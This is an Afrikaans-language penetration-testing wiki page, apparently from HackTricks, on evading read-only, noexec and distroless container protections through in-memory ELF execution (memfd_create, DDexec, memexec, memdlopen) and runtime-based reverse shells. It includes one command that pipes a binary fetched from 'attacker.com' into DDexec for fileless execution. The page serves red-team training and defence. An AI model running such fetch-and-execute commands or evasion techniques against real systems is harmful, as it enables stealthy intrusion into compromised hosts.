# Omseiling van FS-beskerming: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video's

In die volgende video's word die tegnieke op hierdie bladsy in meer diepte verduidelik:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec-scenario

In 'n container kan jy die root-lêerstelsel as read-only mount deur **`readOnlyRootFilesystem: true`** in die sekuriteitskonteks in te stel.<sup>[[3]](#references)</sup> Byvoorbeeld:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

'n Read-only root maak afsonderlik gemounte volumes nie read-only nie. Docker behandel **`/dev/shm`** as 'n IPC-mount, terwyl tmpfs-opsies soos `rw` en `noexec` keuses vir die runtime-konfigurasie is; ondersoek die teikencontainer se mount-opsies voordat jy op enige van hierdie gedrag staatmaak.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Vanuit 'n red-team-perspektief kan dié kombinasie dit moeilik maak om binaries af te laai en uit te voer wat nie reeds beskikbaar is nie (byvoorbeeld backdoors of enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Maklikste omseiling: Skripte

'n `noexec`-mount blokkeer direkte uitvoering van binaries op daardie mount, maar 'n interpreter kan steeds 'n skrip lees en interpreteer. As `sh` of `python` beskikbaar is, kan jy dus 'n shell- of Python-skrip deur daardie interpreter uitvoer.<sup>[[5]](#references)</sup>

Dit help nie wanneer die vereiste tool self 'n binary is nie.<sup>[[5]](#references)</sup>

## Geheue-omseilings

Wanneer direkte uitvoering vanaf 'n gemounte pad geblokkeer word, is een opsie om die ELF in die geheue te laai en dit deur 'n in-geheue-pad uit te voer. Dit vermy die `noexec`-kontrole op daardie mount, maar skakel nie ander kernel-, toestemmings- of beleidskontroles uit nie.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall-omseiling

As 'n scripting-runtime toegang tot die betrokke Linux-koppelvlak het, kan dit 'n anonieme, RAM-gesteunde file descriptor met **`memfd_create(2)`** skep, die ELF-grepe daarheen skryf en 'n fd-gesteunde uitvoeringspad gebruik. Die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genereer saamgeperste en base64-gekodeerde Python-, Perl- of Ruby-kode vir hierdie werkvloei.<sup>[[6]](#references)[[7]](#references)</sup>

Die projek dokumenteer tans Python-, Perl- en Ruby-teikens; PHP of Node vereis 'n ander runtime-spesifieke tegniek of uitbreiding, dus beteken die afwesigheid van hierdie generator vir 'n taal nie dat uitvoering in die geheue onmoontlik is nie.<sup>[[6]](#references)[[12]](#references)</sup>

Sien [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) vir 'n breër bespreking van anonieme-lêer-uitvoering, verwante staging-patrone en opsporing en forensiese versameling.

> [!WARNING]
> 'n Gewone uitvoerbare lêer wat na **`/dev/shm`** geskryf word, bly onderhewig aan daardie mount se **`noexec`**-instelling; om dit bloot deur 'n gewone file descriptor oop te maak, verander nie die mount-beleid nie.<sup>[[5]](#references)</sup>
>
> Die presiese geheue-uitvoeringsmetode hang ook af van die runtime, argitektuur, kernel en beskikbare toestemmings.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) skryf 'n stager en loader deur **`/proc/self/mem`** in die lopende shell-proses, en dra dan beheer aan daardie kode oor.<sup>[[8]](#references)</sup>

Dit stel die proses in staat om 'n gegewe binary te laai sonder om daardie binary eers op 'n uitvoerbare lêerstelsel te plaas.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** kan shellcode of 'n binary vanaf **geheue** laai en **uitvoer**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Vir meer inligting oor hierdie tegniek, kyk na Github of:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is ’n implementering van DDexec wat as ’n daemon loop. Die daemon luister na versoeke wat argumente en rou programgrepe bevat, fork ’n child om elke program te laai en uit te voer, en hou die parent as die server.<sup>[[9]](#references)</sup>

Die repository bevat ’n voorbeeld van hoe om **memexec te gebruik om binaries vanuit ’n PHP reverse shell uit te voer** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Met ’n soortgelyke doel as DDexec is [**memdlopen**](https://github.com/arget13/memdlopen) ’n fileless implementering van `dlopen()` vir ’n shared object of program. Die README dokumenteer tans ARM64-ondersteuning, dus moet jy die teikenargitektuur nagaan voordat jy dit gebruik.<sup>[[10]](#references)</sup>

## Distroless Bypass

Vir ’n toegewyde verduideliking van **wat distroless werklik is**, wanneer dit help, wanneer dit nie help nie, en hoe dit post-exploitation-taktieke in containers verander, kyk na:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Wat is distroless

Distroless-images bevat slegs die application en sy runtime-afhanklikhede; die amptelike images sluit package managers, shells en ander programme wat in ’n standaard Linux-distribution verwag word, uit.<sup>[[11]](#references)</sup>

Deur die runtime-image tot daardie afhanklikhede te beperk, word die sagteware wat in produksie teenwoordig is en die hoeveelheid wat geskandeer en opgespoor moet word, verminder.<sup>[[11]](#references)</sup>

### Reverse Shell

In ’n distroless-container vind jy dalk **nie `sh` of `bash`** vir ’n gewone shell nie, en ook nie algemene utilities soos `ls`, `whoami` of `id` nie.<sup>[[11]](#references)</sup>

> [!WARNING]
> Daarom sal ’n gewone shell-gebaseerde reverse shell of utility-gebaseerde enumerasie dalk nie werk nie.<sup>[[11]](#references)</sup>

As die gekompromitteerde application ’n language runtime insluit (byvoorbeeld Python vir ’n Flask-application of Node.js vir ’n Node-application), kan ’n RCE moontlik steeds daardie runtime gebruik vir ’n command channel en stelselinspeksie deur sy APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Gebruik die beskikbare scripting language om **die stelsel te enumereer** met behulp van sy taalvermoëns.<sup>[[12]](#references)</sup>

As daar geen **read-only/no-exec**-beskermings is nie, kan ’n command channel binaries na ’n skryfbare, uitvoerbare mount skryf en dit uitvoer; verifieer eers die mount-opsies en -toestemmings.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Wanneer hierdie beskermings teenwoordig is, gebruik die **memory-execution-tegnieke hierbo** waar die runtime, kernel en toestemmings dit toelaat.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Jy kan **voorbeelde** vind van die uitbuiting van RCE-kwesbaarhede om scripting-language-**reverse shells** te verkry en binaries vanuit geheue uit te voer in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Verkenning van Linux-geheue-manipulasie vir stealth en evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth-inbrake met DDexec-ng & dlopen() in geheue - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Stel ’n Security Context vir ’n Pod of Container op](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux-handleidingblad](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux-handleidingblad](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
